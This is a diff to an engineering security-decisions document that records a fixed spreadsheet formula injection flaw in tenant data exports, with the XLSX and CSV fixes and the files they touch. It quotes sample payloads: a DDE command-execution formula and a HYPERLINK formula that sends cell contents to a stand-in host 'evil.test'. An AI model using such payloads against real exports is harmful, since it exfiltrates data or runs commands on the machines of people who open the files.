@@ -535,6 +535,103 @@ typed entity. This is a data defect and belongs in the data.
 two PDF builders read — is defensible as its own reviewed change. It mutates historical
 records on live multi-tenant data, so it needs migration review, not a drive-by.
 
+### Spreadsheet formula injection in exports — FIXED (2026-07-31)
+
+**Resolved, not accepted.** This is recorded here because it is the same "escape at the sink"
+argument as the section above, applied to a second sink: the spreadsheet writers. It is **not** a
+suppression and there is nothing outstanding.
+
+**It was pre-existing, and it is not a regression from removing bleach.** Surfaced by the compliance
+audit on PR #172 and deferred to its own ticket, which this is. The distinction matters because the
+two changes landed a day apart: bleach never touched this input. The reason is structural — the
+classic payload `=cmd|'/c calc'!A1` contains no tags and no entities, so `bleach.clean` returned it
+**byte-identical**, as it did every formula payload in this class. The sanitizer's removal neither
+created this defect nor widened it, and reinstating a sanitizer would not have fixed it.
+
+**The defect.** Tenant-supplied text (part descriptions, notes, customer names, visitor purposes,
+report column names) was written into exported spreadsheets verbatim. Excel, LibreOffice Calc and
+Google Sheets evaluate a cell whose text begins with `=`, `+`, `-`, `@`, TAB (`0x09`) or CR (`0x0D`)
+as a **formula** on open, so a stored value such as
+`=HYPERLINK("http://evil.test/?d="&A1,"CLICK")` became a live, clickable exfiltration primitive for
+whoever opened the export. This is **CWE-1236**.
+
+**XLSX was worse than a rendering quirk, and this was confirmed at the XML level, not inferred.**
+`openpyxl` infers a cell's type at assignment, so a leading-`=` Python string became a real `<f>`
+formula element:
+
+```xml
+before:  <c r="A1"><f>HYPERLINK("http://evil.test",A1)</f><v></v></c>
+after:   <c r="A1" t="inlineStr"><is><t>=HYPERLINK("http://evil.test",A1)</t></is></c>
+```
+
+#### The two formats got different fixes, and the difference is the point
+
+**XLSX is fixed non-destructively — no prefixing, no mutation.** XLSX distinguishes a formula cell
+from a string cell in the markup, so the fix pins the cell's declared type rather than rewriting its
+text. The implemented rule is deliberately stronger than "starts with a dangerous character": **if
+the Python value is a `str`, the cell must be a string cell** (`data_type="s"`). That is what makes
+it durable — it also covers openpyxl's *other* coercion branch (an Excel error literal such as
+`#REF!` becomes `data_type="e"`), and it survives any future openpyxl change to what it decides to
+coerce. Values are preserved **byte-exactly**: `+1-555-0134`, `-0.005 TIR`, `- check bore per print`
+and `@rev A` all export unchanged and untouched. Real numbers, dates and booleans keep their types,
+because only `str` values are pinned.
+
+**CSV is fixed destructively, because CSV has no type system.** The only signal a reader has is the
+text itself, so the sole neutralization available is a leading single quote (`'`), which spreadsheet
+applications consume as "read the rest of this cell as text". Collateral is bounded: the prefix is
+applied only when a value **both** starts with a formula-initiating character **and** does not parse
+as a plain finite number, so `-5.00`, `-0.005` and `+1e3` stay usable as numbers. RFC 4180 quoting is
+unchanged and still applied *after* neutralization.
+
+**State the loss precisely: it is lossy on the exported artifact, never on stored data.** That is the
+same boundary the bleach removal turned on — the sanitizer's defect was that it rewrote
+`request._body`, so its output was what got persisted, with no recovery path. Neutralization here
+happens at the writer, at the moment of serialization; the row in the database is unchanged and
+reading it back over the JSON API returns the original text. Do not "improve" this by normalizing
+values on the way in.
+
+#### Two attacker-controlled header paths were also found and fixed
+
+Non-obvious, and worth naming so they are not reintroduced. Header rows were previously written raw
+on the assumption that a header is a fixed developer-authored allowlist. Neither of these is:
+
+- **`columns` is a request query parameter.** Every `/exports/*` endpoint accepts
+  `columns: Optional[List[str]] = Query(None)` and writes it straight through as row 1, so
+  `?columns==HYPERLINK(...)` injected the header of the resulting export.
+- **The analytics CSV header is tenant-authored.** `GET /analytics/custom-report/export` derives its
+  header from a saved `ReportTemplate`'s column list.
+
+#### Scope of the fix
+
+Backend — one shared helper, `app/services/export_safety.py` (XLSX: `force_text_cell` / `write_cell`
+/ `append_row` / `harden_worksheet` / `harden_workbook`; CSV: `is_formula_initiating` /
+`sanitize_csv_value` / `sanitize_csv_row` / `sanitize_csv_mapping`) — applied in the four writers of
+tenant data:
+
+| Writer | Covers |
+|---|---|
+| `app/services/export_service.py` (`generate_csv` + `generate_excel`) | all 14 `/api/v1/exports/*` responses (7 endpoints × csv/xlsx) |
+| `app/services/estimate_workbench_export_service.py` | the 5-sheet estimate audit workbook |
+| `app/api/endpoints/analytics.py` | custom-report CSV |
+| `app/api/endpoints/visitor_logs.py` | `GET /visitor-logs/export.csv` |
+
+Frontend — a new shared `src/utils/csv.ts` (`neutralizeCsvFormula` / `quoteCsvField` /
+`escapeCsvField`), adopted by `components/ui/DataTable.tsx` (the shared CSV export behind every
+`csvExport` page, ~25 of them, including Users and Visitor Log) and `pages/PartsNew.tsx`, which
+carried a **second independent builder** whose RFC 4180 quoting was also weaker (it missed `\r`).
+`PartsNew.copySelectedParts` — which writes tab-separated tenant data to the clipboard specifically
+so it can be pasted into a spreadsheet — is neutralized on the same grounds; it is the same injection
+class with the file step removed.
+
+**Deliberately left alone:** the CSV/XLSX **readers** (`load_workbook`, `csv.reader`) on the import
+paths, which must see stored bytes as they are, and the static import-template builder, which
+contains no tenant data.
+
+**One clarification against the section above.** Finding 2 of the bleach removal — "exactly one
+backend sink interprets markup" — remains true as written: a spreadsheet cell interprets *formulas*,
+not markup, and `pdf_escape` was never the control for it. Read that finding as scoped to markup
+sinks, not as "every output sink is covered".
+
 ### The JSON body-size cap (added 2026-07-30 as the bleach DoS fix; retained)
 
 The replacement investigation did not find a replacement. It found a live production
